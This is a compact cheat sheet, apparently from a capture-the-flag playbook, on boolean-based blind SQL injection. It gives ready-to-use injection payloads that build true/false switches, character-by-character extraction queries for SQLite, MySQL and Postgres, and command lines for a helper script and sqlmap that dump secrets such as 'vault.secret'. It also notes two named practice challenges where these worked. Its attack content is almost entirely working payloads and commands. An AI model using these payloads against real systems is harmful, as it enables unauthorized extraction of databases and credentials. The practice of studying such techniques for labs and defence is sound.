# Boolean-based blind SQLi

**Signs**: no data/errors shown, but the page differs between true and false conditions: a
**count** ("3 files"), a row present/absent, "found"/"not found", different length or status.
Hints "ask, then count the answers", "some lines appear, some don't".

## 1. Build a true/false switch
Make the base query match **nothing**, then OR/UNION in your condition:
```sql
zzz' OR (<COND>) --                                   -- count > 0 when COND true
zzz' UNION SELECT 1,'>>MARK<<',3,4 WHERE (<COND>) --   -- marker row visible when COND true
x' AND (<COND>) --                                    -- original row shown only when true
```
Check: `<COND>` = `1=1` vs `1=2` must give different pages.

## 2. Extract char by char
```sql
-- SQLite
(SELECT unicode(substr(content,{pos},1)) FROM files WHERE name='quarterly-keys.txt') > {mid}
(SELECT substr(secret,{pos},1) FROM vault LIMIT 1) = '{c}'
-- MySQL
ASCII(SUBSTRING((SELECT secret FROM vault LIMIT 1),{pos},1)) > {mid}
-- Postgres
ASCII(SUBSTRING((SELECT secret FROM vault LIMIT 1),{pos},1)) > {mid}
```
Binary search = ~7 requests/char. Length first: `LENGTH((SELECT secret FROM vault))>{n}`.

## 3. Script (generic)
```bash
# count oracle: true when "N file" with N>0 appears
python scripts/sqli/blind_bool.py "$T/search?q={}" \
  --template "zzz' OR ({cond}) -- " --true-regex '[1-9]\d* file' \
  --query "SELECT content FROM files WHERE name='quarterly-keys.txt'" --dbms sqlite
# marker oracle
python scripts/sqli/blind_bool.py "$T/?tag={}" \
  --template "zzz' UNION SELECT 1,'MARK',3,4 WHERE ({cond}) -- " --true-text MARK \
  --query "SELECT secret FROM vault LIMIT 1" --dbms sqlite
```
`{cond}` is filled with the comparison; `--query` is any scalar subquery. Use `--post 'q={}'` for
POST, `-c` for cookies. Enumerate tables first with `--query "SELECT group_concat(name) FROM sqlite_master"`.

sqlmap: `sqlmap -u "$T/search?q=x" --technique=B --string '1 file' --dbms sqlite --dump`

Seen in: `sqli4` (DropLite: match count, content of `quarterly-keys.txt`), `sqli5` (Daily Byte: marker
row via UNION, `vault.secret`; page HTML-escapes the marker — use a plain-alnum marker).
